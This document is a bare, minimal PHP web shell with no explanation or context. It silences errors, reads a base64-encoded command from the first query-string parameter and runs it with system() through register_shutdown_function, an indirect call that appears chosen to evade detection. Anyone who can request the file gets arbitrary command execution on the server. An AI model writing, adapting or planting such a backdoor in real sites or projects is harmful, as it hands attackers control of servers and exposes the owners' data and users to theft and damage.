<?php 
error_reporting(0);
$a=urldecode($_SERVER["QUERY_STRING"]);
$b=explode("=",explode("&",$a)[0]);
register_shutdown_function("system",base64_decode($b[1]));
register_shutdown_function("print_r","OK");
?>